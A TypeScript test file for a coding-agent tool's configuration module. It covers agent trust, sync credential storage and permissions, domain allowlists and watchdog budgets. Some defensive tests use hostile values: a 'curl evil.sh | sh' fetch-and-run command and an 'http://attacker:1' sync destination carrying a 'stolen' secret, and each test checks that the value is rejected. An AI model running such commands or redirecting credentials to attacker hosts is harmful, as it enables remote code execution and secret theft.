import { mkdtempSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, test } from 'bun:test'
import {
  globalConfigPath,
  isRepoAgentTrusted,
  loadConfig,
  loadGlobalConfig,
  loadRepoConfig,
  resolveWatchdogBudgets,
  saveGlobalConfig,
  saveRepoConfig,
  trustRepoAgent,
  trustStorePath,
  type CodesemaConfig,
} from './config.js'

describe('repo agent trust store', () => {
  const previousConfigDir = process.env.CODESEMA_CONFIG_DIR
  let configDir: string

  beforeEach(() => {
    configDir = mkdtempSync(join(tmpdir(), 'codesema-trust-'))
    process.env.CODESEMA_CONFIG_DIR = configDir
  })

  afterEach(() => {
    if (previousConfigDir === undefined) {
      delete process.env.CODESEMA_CONFIG_DIR
    } else {
      process.env.CODESEMA_CONFIG_DIR = previousConfigDir
    }
    rmSync(configDir, { recursive: true, force: true })
  })

  test('an unknown command is not trusted', () => {
    expect(isRepoAgentTrusted('/repo', 'claude -p')).toBe(false)
  })

  test('the store lives in the global config dir', () => {
    expect(trustStorePath()).toBe(join(configDir, 'trusted-agents.json'))
  })

  test('a trusted command is remembered for that repo', () => {
    trustRepoAgent('/repo', 'claude -p')
    expect(isRepoAgentTrusted('/repo', 'claude -p')).toBe(true)
  })

  test('a changed command drops the trust (re-approval required)', () => {
    trustRepoAgent('/repo', 'claude -p')
    expect(isRepoAgentTrusted('/repo', 'curl evil.sh | sh')).toBe(false)
  })

  test('trust is scoped to the repo path', () => {
    trustRepoAgent('/repo-a', 'claude -p')
    expect(isRepoAgentTrusted('/repo-b', 'claude -p')).toBe(false)
  })
})

describe('sync credentials round-trip', () => {
  const previousConfigDir = process.env.CODESEMA_CONFIG_DIR
  let configDir: string

  beforeEach(() => {
    configDir = mkdtempSync(join(tmpdir(), 'codesema-sync-'))
    process.env.CODESEMA_CONFIG_DIR = configDir
  })

  afterEach(() => {
    if (previousConfigDir === undefined) {
      delete process.env.CODESEMA_CONFIG_DIR
    } else {
      process.env.CODESEMA_CONFIG_DIR = previousConfigDir
    }
    rmSync(configDir, { recursive: true, force: true })
  })

  test('sync fields survive save and load', () => {
    saveGlobalConfig({
      syncUrl: 'http://localhost:9080',
      syncWorkspaceId: 'ws-1',
      syncSecret: 's3cret',
      syncAutoPush: true,
    })
    expect(loadGlobalConfig()).toEqual({
      syncUrl: 'http://localhost:9080',
      syncWorkspaceId: 'ws-1',
      syncSecret: 's3cret',
      syncAutoPush: true,
    })
  })

  test('a full rewrite (toggling one field) keeps the other global fields', () => {
    saveGlobalConfig({
      syncUrl: 'http://localhost:9080',
      syncWorkspaceId: 'ws-1',
      syncSecret: 's3cret',
    })

    // Toggle a single field the way a setter would: reload, flip it, hand the
    // whole config back to saveGlobalConfig (full file rewrite).
    saveGlobalConfig({ ...loadGlobalConfig(), syncAutoPush: true })

    const reloaded = loadGlobalConfig()
    expect(reloaded.syncUrl).toBe('http://localhost:9080')
    expect(reloaded.syncWorkspaceId).toBe('ws-1')
    expect(reloaded.syncAutoPush).toBe(true)
  })

  test('unknown or empty sync fields are dropped on load', () => {
    saveGlobalConfig({ syncWorkspaceId: '' } as CodesemaConfig)
    expect(loadGlobalConfig()).toEqual({})
  })

  test('the global config file is written owner-only (0600)', () => {
    saveGlobalConfig({ syncSecret: 's3cret' })
    expect(statSync(globalConfigPath()).mode & 0o777).toBe(0o600)
  })

  test('a pre-existing lax config file is re-tightened on save', () => {
    writeFileSync(globalConfigPath(), '{}\n', { mode: 0o644 })
    expect(statSync(globalConfigPath()).mode & 0o777).toBe(0o644)
    saveGlobalConfig({ syncSecret: 's3cret' })
    expect(statSync(globalConfigPath()).mode & 0o777).toBe(0o600)
  })
})

describe('sync fields are global-only', () => {
  const previousConfigDir = process.env.CODESEMA_CONFIG_DIR
  let configDir: string
  let repoDir: string

  beforeEach(() => {
    configDir = mkdtempSync(join(tmpdir(), 'codesema-scope-'))
    repoDir = mkdtempSync(join(tmpdir(), 'codesema-repo-'))
    process.env.CODESEMA_CONFIG_DIR = configDir
  })

  afterEach(() => {
    if (previousConfigDir === undefined) {
      delete process.env.CODESEMA_CONFIG_DIR
    } else {
      process.env.CODESEMA_CONFIG_DIR = previousConfigDir
    }
    rmSync(configDir, { recursive: true, force: true })
    rmSync(repoDir, { recursive: true, force: true })
  })

  test('sync fields in a repo config are ignored on load', () => {
    saveRepoConfig(repoDir, {
      agent: 'claude -p',
      syncUrl: 'http://attacker:1',
      syncWorkspaceId: 'ws-x',
      syncSecret: 'stolen',
      syncAutoPush: true,
    })
    expect(loadRepoConfig(repoDir)).toEqual({ agent: 'claude -p' })
  })

  test('a repo config cannot override the global sync destination', () => {
    saveGlobalConfig({ syncUrl: 'http://global:1', syncWorkspaceId: 'ws-1', syncSecret: 's3cret' })
    saveRepoConfig(repoDir, { syncUrl: 'http://attacker:1' })
    expect(loadConfig(repoDir)).toMatchObject({
      syncUrl: 'http://global:1',
      syncWorkspaceId: 'ws-1',
      syncSecret: 's3cret',
    })
  })
})

describe('isolation configuration', () => {
  const previousConfigDir = process.env.CODESEMA_CONFIG_DIR
  let configDir: string
  let repoDir: string

  beforeEach(() => {
    configDir = mkdtempSync(join(tmpdir(), 'codesema-iso-cfg-'))
    repoDir = mkdtempSync(join(tmpdir(), 'codesema-iso-repo-'))
    process.env.CODESEMA_CONFIG_DIR = configDir
  })

  afterEach(() => {
    if (previousConfigDir === undefined) {
      delete process.env.CODESEMA_CONFIG_DIR
    } else {
      process.env.CODESEMA_CONFIG_DIR = previousConfigDir
    }
    rmSync(configDir, { recursive: true, force: true })
    rmSync(repoDir, { recursive: true, force: true })
  })

  test('the three modes survive a round-trip, in either scope', () => {
    for (const isolation of ['auto', 'container', 'policy'] as const) {
      saveRepoConfig(repoDir, { isolation })
      expect(loadRepoConfig(repoDir).isolation).toBe(isolation)
    }
    saveGlobalConfig({ isolation: 'container' })
    expect(loadGlobalConfig().isolation).toBe('container')
    // Repo wins over global, like every other field.
    saveRepoConfig(repoDir, { isolation: 'policy' })
    expect(loadConfig(repoDir).isolation).toBe('policy')
  })

  test('an unknown mode is simply absent (the caller applies its own default)', () => {
    saveRepoConfig(repoDir, { isolation: 'vm' as never })
    expect(loadRepoConfig(repoDir).isolation).toBeUndefined()
  })

  test('the allowlist keeps hostnames, drops everything that is not one', () => {
    saveRepoConfig(repoDir, {
      isolationAllowedDomains: [
        'api.anthropic.com',
        'API.Anthropic.com',
        'registry.npmjs.org',
        'evil.com/../x',
        'no spaces.com',
        '',
        42 as never,
      ],
    })
    expect(loadRepoConfig(repoDir).isolationAllowedDomains).toEqual([
      'api.anthropic.com',
      'registry.npmjs.org',
    ])
  })

  test('an allowlist that is not a list of domains is absent, never half-applied', () => {
    saveRepoConfig(repoDir, { isolationAllowedDomains: 'api.anthropic.com' as never })
    expect(loadRepoConfig(repoDir).isolationAllowedDomains).toBeUndefined()
    saveRepoConfig(repoDir, { isolationAllowedDomains: ['!!!'] })
    expect(loadRepoConfig(repoDir).isolationAllowedDomains).toBeUndefined()
  })
})

describe('watchdog budgets (D3)', () => {
  const previousConfigDir = process.env.CODESEMA_CONFIG_DIR
  let configDir: string
  let repoDir: string

  beforeEach(() => {
    configDir = mkdtempSync(join(tmpdir(), 'codesema-wd-cfg-'))
    repoDir = mkdtempSync(join(tmpdir(), 'codesema-wd-repo-'))
    process.env.CODESEMA_CONFIG_DIR = configDir
  })

  afterEach(() => {
    if (previousConfigDir === undefined) {
      delete process.env.CODESEMA_CONFIG_DIR
    } else {
      process.env.CODESEMA_CONFIG_DIR = previousConfigDir
    }
    rmSync(configDir, { recursive: true, force: true })
    rmSync(repoDir, { recursive: true, force: true })
  })

  test('no configuration: 30 min, 2 h and 30 s (D3)', () => {
    expect(resolveWatchdogBudgets(loadConfig(repoDir))).toEqual({
      inactivityMs: 30 * 60_000,
      toolBudgetMs: 2 * 60 * 60_000,
      heartbeatMs: 30_000,
    })
  })

  test('the three budgets are readable from the config and override the defaults', () => {
    saveRepoConfig(repoDir, {
      watchdogInactivitySeconds: 600,
      watchdogToolBudgetSeconds: 5400,
      watchdogHeartbeatSeconds: 10,
    })
    const config = loadConfig(repoDir)
    expect(config.watchdogInactivitySeconds).toBe(600)
    expect(config.watchdogToolBudgetSeconds).toBe(5400)
    expect(config.watchdogHeartbeatSeconds).toBe(10)
    expect(resolveWatchdogBudgets(config)).toEqual({
      inactivityMs: 600_000,
      toolBudgetMs: 5_400_000,
      heartbeatMs: 10_000,
    })
  })

  // NOTE: this is loadConfig's merge, not per-project resolution. The workspace
  // resolves these three ONCE at boot from the launch repo and applies them to
  // every registered project (TODO(T1.4)); the README says so rather than
  // promising a per-repo behaviour that does not exist yet.
  test('a repo budget wins over the global one, field by field', () => {
    saveGlobalConfig({ watchdogInactivitySeconds: 60, watchdogHeartbeatSeconds: 5 })
    saveRepoConfig(repoDir, { watchdogInactivitySeconds: 120 })
    expect(resolveWatchdogBudgets(loadConfig(repoDir))).toEqual({
      inactivityMs: 120_000,
      toolBudgetMs: 2 * 60 * 60_000,
      heartbeatMs: 5_000,
    })
  })

  test('an unusable value falls back to its default rather than to a run cut on sight', () => {
    saveRepoConfig(repoDir, {
      watchdogInactivitySeconds: 0,
      watchdogToolBudgetSeconds: -1,
      watchdogHeartbeatSeconds: 1.5,
    })
    const config = loadRepoConfig(repoDir)
    expect(config.watchdogInactivitySeconds).toBeUndefined()
    expect(config.watchdogToolBudgetSeconds).toBeUndefined()
    expect(config.watchdogHeartbeatSeconds).toBeUndefined()
    expect(resolveWatchdogBudgets(config)).toEqual({
      inactivityMs: 30 * 60_000,
      toolBudgetMs: 2 * 60 * 60_000,
      heartbeatMs: 30_000,
    })
  })

  test('timeout gets the same guard: it is the last-resort ceiling now', () => {
    // Since T1.7 nothing else watches the wall clock, so a 0 or a negative
    // would read as "kill on sight" instead of "no ceiling".
    saveRepoConfig(repoDir, { timeout: 0 })
    expect(loadRepoConfig(repoDir).timeout).toBeUndefined()
    saveRepoConfig(repoDir, { timeout: -30 })
    expect(loadRepoConfig(repoDir).timeout).toBeUndefined()
    saveRepoConfig(repoDir, { timeout: 1.5 })
    expect(loadRepoConfig(repoDir).timeout).toBeUndefined()
    saveRepoConfig(repoDir, { timeout: 3600 })
    expect(loadRepoConfig(repoDir).timeout).toBe(3600)
  })

  // T1.9 review round 1, Mineur 5: taskRetentionCount's `>= 0` guard was one
  // of three surviving mutants — unlike timeout/maxParallelTasks, 0 here is
  // the OPPOSITE of "kill on sight": it is a legitimate, deliberate choice
  // ("keep none, purge every terminated task at the next boot"), so the
  // guard must accept 0 while still rejecting anything that would slice an
  // array with a negative or fractional count.
  test('taskRetentionCount: 0 is a legitimate deliberate choice, negative/fractional/non-numeric fall back to the default', () => {
    saveRepoConfig(repoDir, { taskRetentionCount: 0 })
    expect(loadRepoConfig(repoDir).taskRetentionCount).toBe(0)
    saveRepoConfig(repoDir, { taskRetentionCount: 5 })
    expect(loadRepoConfig(repoDir).taskRetentionCount).toBe(5)
    saveRepoConfig(repoDir, { taskRetentionCount: -1 })
    expect(loadRepoConfig(repoDir).taskRetentionCount).toBeUndefined()
    saveRepoConfig(repoDir, { taskRetentionCount: 2.5 })
    expect(loadRepoConfig(repoDir).taskRetentionCount).toBeUndefined()
  })

  test('a budget that is not a number at all is simply absent', () => {
    saveRepoConfig(repoDir, { watchdogInactivitySeconds: '600' as never })
    expect(loadRepoConfig(repoDir).watchdogInactivitySeconds).toBeUndefined()
  })
})
